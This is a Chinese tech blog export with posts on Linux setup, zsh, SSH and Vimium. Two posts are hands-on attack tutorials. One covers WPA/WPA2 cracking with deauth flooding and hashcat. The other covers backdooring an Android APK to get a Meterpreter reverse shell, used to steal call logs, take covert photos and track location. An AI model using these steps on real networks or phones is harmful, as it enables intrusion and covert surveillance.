Mailvelope指南：https://securityinabox.org/en/guide/mailvelope/web/]]></content>
      <tags>
        <tag>Privacy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Manjaro Linux 配置Intel与Nvidia双显卡切换]]></title>
    <url>%2F2018%2F03%2F19%2FBumblebee%2F</url>
    <content type="text"><![CDATA[BumblebeeBumblebee是一套Linux下双显卡切换的解决方案，通过它可以自由的切换集显与独立显卡，做到续航与性能的平衡。 安装Manjaro 提供了强大的硬件检测模块mhwd,可以很方便的安装各种驱动。 安装依赖 sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus 安装nvidia闭源驱动与intel驱动混合版bumblebee sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee 开启自动启动bumblebeed服务 sudo systemctl enable bumblebeed 将用户添加到bumblee组 sudo gpasswd -a $USER bumblebee 如果一切顺利的话，重启后就可以在你想运行的程序名前面加optirun,好使用独立显卡驱动你的应用程序。 但很大可能是重启后发现无法进入图形化界面,你可以尝试在Grub菜单启动界面按[E]编辑，找到quite并在后面加入(注意空格): acpi_osi=! acpi_osi=’Windows 2009’或者acpi_osi=! acpi_osi=Linux acpi_osi=’Windows 2015’ pcie_port_pm=off(很多硬件厂商的BIOS驱动都对Linux不友好，无法顺利加载ACPI模块，而导致无法驱动独立显卡,acpi_osi=’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，别闹情绪了，赶紧工作吧。)接着按[Ctrl]+[x]或[F10]保存更改并启动系统。 顺利进入系统后打开终端更改配置文件 sudo vim /etc/default/grub 给 “GRUB_CMLINE_LINUX_DEFAULT”添加你可以正常启动Linux的‘acpi_osi’参数，如图我用的是’Windows 2009’。 更新Grub文件,即可永久解决不能启动图形界面的问题 sudo update-grub 测试性能 安装测试软件 sudo pacman -S mesa-demos 集显性能 glxgears -info 独显性能 optirun glxgears -info 其他问题 NVIDIA面板无信息 optirun -b none nvidia-settings -c :8 不依赖Bumblebee来使用CUDA sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ‘ON’ 使用完CUDA 停止NVIDIA显卡 sudo rmmod nvidia_uvm nvidia &amp;&amp; sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF 参考 https://gist.github.com/Misairu-G/616f7b2756c488148b7309addc940b28 https://wiki.manjaro.org/index.php?title=Configure_NVIDIA_(non-free)_settings_and_load_them_on_Startup https://wiki.archlinux.org/index.php/Bumblebee#Primusrun]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Aircrack&hashcat破解WPA/WPA2]]></title>
    <url>%2F2018%2F03%2F15%2Faircrack-hashcat%2F</url>
    <content type="text"><![CDATA[==================== 写在前面这里假定你用的是Manjaro Linux 系统，配置好独立显卡，本文提到的软件可以直接用sudo pacman -S aircrack-ng hashcat hashcat-utils安装,Kali Linux默认集成，其他环境请自行安装。 aircrack-ng:aircrack-ng是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。 hashcat:hashcat支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。 USB无线网卡:推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。 由于hashcat使用GPU破解，因此需要安装依赖，sudo pacman -S ocl-icd opencl-nvidia,执行sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ON以让CUDA程序使用英伟达独立显卡。 hashcat -I看到你的独显信息就可以愉快的使用hashcat了。 Aircrack 查看无线网卡，我的网卡为wlan0 airmon-ng 将网卡设为监听模式 airmon-ng start wlan0执行iwconfig出现Mode:Monitor即执行成功，并可以看到网卡被重命名为wlan0mon。若执行失败，请先尝试airmon-ng check kill，依旧不行，请检查你的网卡驱动是否被支持 搜索目标 airodump-ng wlan0mon 12345BSSID:无线路由的MAC地址PWR：无线信号强度（绝对值越小表示信号越强）CH:信道号ENC:加密体系，常见WPA，WPA2，WEPESSID:扩展路由名称 这里以ELJNB为例，进行抓包： airodump-ng –bssid DC:FE:18:C4:20:E3 -o pcap -w my -c 1 wlan0mon 12345--bssid: 指定无线路由的MAC地址,这里是ELJNB的MAC地址-o:指定输出文件格式， 支持pcap, ivs, csv, gps, kismet, netxml-w:保存文件名称，会自动加01，02，03作为序号。-c:指定工作频道，ELJNB工作在频道1最后是你的网卡接口名称 注意STATION那列里的MAC地址，稍后会用到，并保持airodump-ng一直处于运行状态。 加速获取握手包我们可以使用泛洪攻击断开某设备的连接，迫使其重连,以顺利捕获我们需要的数据（含有WiFi的密码数据包）。新开一个终端，输入 aireplay-ng –deauth 1 –a DC:FE:18:C4:20:E3 -c E6:20:3A:A4:82:10 wlan0mon 123--deauth:取消验证洪水攻击，后面是攻击次数，0代表无限次数。-a:目标路由MAC地址-c:连到这个路由某的设备MAC地址，可以在STATION那列中随便选一个。 回到airodump-ng窗口,若在右上角发现WPA handshake ，即成功捕获数据。若不成功请多试几次。顺利捕获数据后就可以用Ctrl+C终止airodump-ng了。会发现它在当前路径生成了一个my-01.cap文件，现在可以进行最后一步,破解数据了。 暴力破解 在线破解：Online Hash Crack GPUHASH.me md5this 本地破解:aircrack-ng -w dict.txt my-01.cap这里破解速度就取决与你CPU性能和字典文件(dict.txt)够不够强大了。如果需要，可以从网上找一些字典文件aircrack-ng使用CPU破解，效率比较低，这里推荐hashcat，它可以使用GPU加速你的破解过程。 haschcathashcat需要特殊的hash数据包格式，因此需要先将airodump-ng抓取的数据包转换一下，在线转换或本地使hashcat-utils所提供的工具包 用cap2hccapx将cap转化为hccapx 开始暴力破解 hashcat -m 2500 test.hccapx dict.txt 123-m:hash类型 2500 为wpa/wpa2test.hccapx:数据包文件dict.txt:为字典文件 破解结束后，查看结果 cat ～/.hashcat/hashcat.porifle最后即为WiFi密码，关于hashcat高级使用方式，见wooyun 扩展可以看到，整个过程无非两步，第一步抓取WPA handshake数据包，第二步暴力破解数据文件。因此可以使用更强大的工具wlandump-ng：一次性从附近的网络上抓取所有的 handshake 信息，而实现快速破解WiFi,详情见wifi-cracking和hcxtools 最大的安全隐患永远是人，优先使用WiFi万能钥匙也许会有意外惊喜(配合手机自带的WiFi分享功能，可以直接得到密码)。 参考 https://www.bennythink.com/wifi-cracking.html https://klionsec.github.io/2015/04/14/aircrack-hascat/ http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/ https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi]]></content>
      <tags>
        <tag>WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[终端环境之Zsh＆oh-my-zsh]]></title>
    <url>%2F2018%2F03%2F14%2Foh-my-zsh%2F</url>
    <content type="text"><![CDATA[============== 终极 Shell(zsh)介绍 Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。 改进特性: 色彩高亮 更强大的自动补全 支持通配符搜索 兼容Bash 完全可定制化 安装 sudo pacman -S zsh zsh-completions 此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包 使用 将zsh设为默认shell chsh -s /bin/zsh 其他发行版可先用chsh -l 查看zsh安装位置 Oh-my-zsh curl 和 git 应该已被安装(若没有Arch 用sudo pacman -S curl git 安装，其他发行版类似。) Oh-my-zsh是一个傻瓜化的zsh配置管理框架，提供了大量实用的功能，主题等。做到开箱即用，现在基本成为了Zsh的标配。 安装 1sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)" 配置文件位置： ~/.zshrc 主题oh-my-zsh自带大量Themes，默认为robbyrussell。你也可以选择random，即每次打开终端随机选一个主题。 ZSH_THEME=”你喜欢的主题名” 常用插件 git: 提供大量git的Aliases，详情 archlinux： 提供一些pacman包管理器的Aliases，详情 z：经常使用cd 切换路径，积累一定数据后可用z快速跳转到指定位置 sudo：按两次[Esc]自动在前面加sudo pip： 补全pip 命令 zsh-autosuggestions: 根据历史记录进行智能提示(按 ctrl+E 是正确姿势)。非oh-my-zsh自带，用git下载安装 1git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions zsh-syntax-highlighting：命令高亮，正确显示绿色，错误为红色。非oh-my-zsh自带，用git下载安装 1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting plugins=( 你想启用的插件，空格分隔 ) 重新加载配置文件，立刻生效。 source ~/.zshrc 其他插件请参见官方wiki 少即是多，启用大量插件会严重拖慢zsh启动速度 参考 https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4 https://en.wikipedia.org/wiki/Z_shell http://macshuo.com/?p=676]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[笔记本安装 Manjaro Linux]]></title>
    <url>%2F2018%2F03%2F09%2Farchlinuxcn%2F</url>
    <content type="text"><![CDATA[==================== Manjaro简介Manjaro Linux是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自DistroWatch），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。 无法进入安装程序 如果自动图形界面启动不了，卡在以下位置： Started TLP system startup/shutdown A start job is running for livemedia mhwd scripe(xx s/no limit) 可尝试添加内核参数 看到启动菜单,用方向键移动选中boot项，按[E]键编辑 把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下: driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’ 修改完成后按[F10]启动，并完成安装。 配置 archlinuxcn 源archlinuxcn 简介Arch Linux 中文社区仓库 是由 Arch Linux 中文社区驱动的非官方用户仓库。包含大量中文用户常用软件、工具、字体/美化包等。 启用archlinuxcn库 先换一下国内源，加快下载速度 sudo pacman-mirrors -lc 修改配置文件 sudo nano /etc/pacman.conf 在文末添加 [archlinuxcn]Server = https://mirrors.zju.edu.cn/archlinuxcn/$arch 添加PGP密钥 sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring 测试 sudo pacman -S yay 以后就可以直接使用 yay softname 搜索并安装AUR库中的软件。 安装中文输入法 推荐Rime sudo pacman -S fcitx-im fcitx-configtool fcitx-rime Rime扩展增强词库 创建配置文件 vim ~/.xprofile 123export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot; 注销生效 其他常用软件一下软件均可通过 pacman / yay 进行安装使用 albert: 谁用谁知道的效率增强神器 chromium: Chrome浏览器 开源版 deepin-wechat / electronic-wechat : Linux下微信解决方案 wps-office: WPS的Linux版比libreoffice更方便些 listen1: Listen 1可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐网站的歌曲 goldendict: 功能强大的词典软件 keepassxc: 跨平台的本地密码管理器 noto-fonts-cjk: 中文字体，当然还有文泉系列(wqy-microhei) proxychains-ng: 你懂的 virtualbox: 开源、轻巧，快速的虚拟机软件 zsh / fish : 人生苦短，我用zsh, zsh 建议搭配oh-my-zsh使用, fish 可以开箱即用 vlc/smplayer： 功能强大本地媒体播放器 visual-studio-code-bin： 微软发布的开源代码编辑器，支持多种语言。 Dbeaver: 一个通用的数据库管理工具和SQL 客户端,提供dbeaver-ce 社区版]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH免密登录]]></title>
    <url>%2F2018%2F03%2F07%2Fssh-keygen%2F</url>
    <content type="text"><![CDATA[======================== SSH单密钥配置 生成ssh密钥文件 ssh-keygen -t ecdsa -b 521 1234-t 为指定加密算法类型，支持rsa，dsa，ecdsa-b 指定密钥大小，ecdsa算法默认大小为256位ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高 如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。 将公钥上传到远程服务器 ssh-copy-id username@remote_ip ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中 测试 ssh username@remote_ip SSH多密钥配置 生成密钥 ssh-keygen -t ecdsa -b 521 -f ~/.ssh/one -C “remote_ip” 12-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户 将公钥上传到远程服务器 ssh-copy-id -i ~/.ssh/one.pub username@remote_ip 1-i 指定上传公钥名称 创建SSH配置文件来管理多组密钥 vim ~/.ssh/config 123456Host remote_ip1 IdentitiesOnly yes IdentityFile ~/.ssh/oneHost remote_ip2 IdentitiesOnly yes IdentityFile ~/.ssh/two Host后面写: 远程主机ip地址IdentityFile后面写 你创建的密钥位置与名称 测试 ssh username@remote_ip 其他 将本地文件上传到远程主机 scp local_file remote_username@remote_ip:remote_folder 将远程主机中的文件下载到本地 scp remote_username@remote_ip:remote_file local_folder 参考 https://wiki.archlinux.org/index.php/SSH_keys http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生成apk后门实现msf控制安卓手机]]></title>
    <url>%2F2018%2F03%2F02%2Fbackdoor-apk%2F</url>
    <content type="text"><![CDATA[======================== 实验环境： Kali Linux android 同一局域网 生成后门安装依赖环境 apt-get install lib32z1 lib32ncurses5 lib32stdc++6 下载 backdoor-apk git clone https://github.com/dana-at-cp/backdoor-apk.git 下载完成后进入文件目录 cd backdoor-apk/backdoor-apk 将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行 ./backdoor-apk.sh test.apkPS:test.apk 为事先准备好的正常apk应用名 选择payload 出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件 meterpreter执行 msfconsole -r backdoor-apk.rc 手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell可以看到获得反弹shell 会话用sessions -i number 切换到当前会话此处执行check_root 测试其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等 可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样12345use exploit/multi/handler set payload android/meterpreter/reverse_tcp set lhost 192.168.0.105 set lport 8888 exploit 问题 [!] Failed to recompile original project with backdoor 现在很多应用都会做一些处理防止反编译，可以上 APKPure 或酷安 去找一些历史版本会增加成功概率 apktools 过旧，可以把Kail 更到最新 一定要把 apk 放到backdoor-apk.sh 所在目录下 拓展 外网环境可使用vps转发 或 ngrok穿透 参考 vps 转发 http://www.freebuf.com/sectool/136574.html ngrok穿透 http://www.freebuf.com/sectool/162046.html 植入木马方式 内网dns劫持: http://www.freebuf.com/sectool/136574.html 物理接触 参考 http://www.secist.com/archives/680.html http://www.4hou.com/mobile/8290.html]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vimium 入门]]></title>
    <url>%2F2018%2F02%2F28%2Fvimium%2F</url>
    <content type="text"><![CDATA[======================== vimium 介绍Vimium 是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。 下载地址：ChromeFirefox Vimium使用总结 页内浏览 j:向下滚动一点 k:向上滚动一点 gg:到页面最底部 G:到页面最底部 d:向下翻一屏 u:向上翻一屏 gs:查看源代码 gi:聚焦到第一个输入点 i/Esc: 输入模式/命令模式 快速选取 /:快速查找 [n] 向下匹配项 [N]向上匹配 yy:拷贝当前页面的URL yf:拷贝指定URL V:选取指定段内容 标签操作 t:创建一个新标签 T:显示所有标签 J:上一个标签 K:下一个标签 x:关闭当前标签 X:恢复上个关闭的标签 r:重新加载 [F5] 导航操作 p/P : 打开剪贴板内的链接,否则进行搜索 o/O:从收藏夹、历史记录打开网址：如果你输的是一个网址，可以直接回车。 f/F: 快速打开某链接 gf：跳到父页面 H:回退上一个历史页面 [&lt;-] L:回到下一个历史页面 [-&gt;] 浏览器快捷键 ctrl+w: 关闭当前页面 ctrl+t: 新建标签 F6: 在当前页面输入URL ctrl+d: 为当前页添加书签 其他某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带的快捷键。]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔・一]]></title>
    <url>%2F2018%2F02%2F16%2Fpoetry%2F</url>
    <content type="text"><![CDATA[=========================== 喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。 初心捡起一段坚韧的丝线，串起断线的曾经。抓住夏的尾巴，将时钟拨到最初。夏花灿烂那时，是我们的开始。贪念着空气里的丝丝香甜， 就这样静静地，静静地望着你。截一段甜到发稠的岁月，缓缓流淌在时光里。折一只小船，轻轻飘荡到你的心房。小船轻触你内心的柔软，扒开你坚硬的外壳。 原来你是最初的心动，是夏日最绵软的清风。我想如果我爱你，可是我发现不是如果，我一直都在爱你。 &ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;—— 李十四 非原创，经原作者授权而发布于此。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
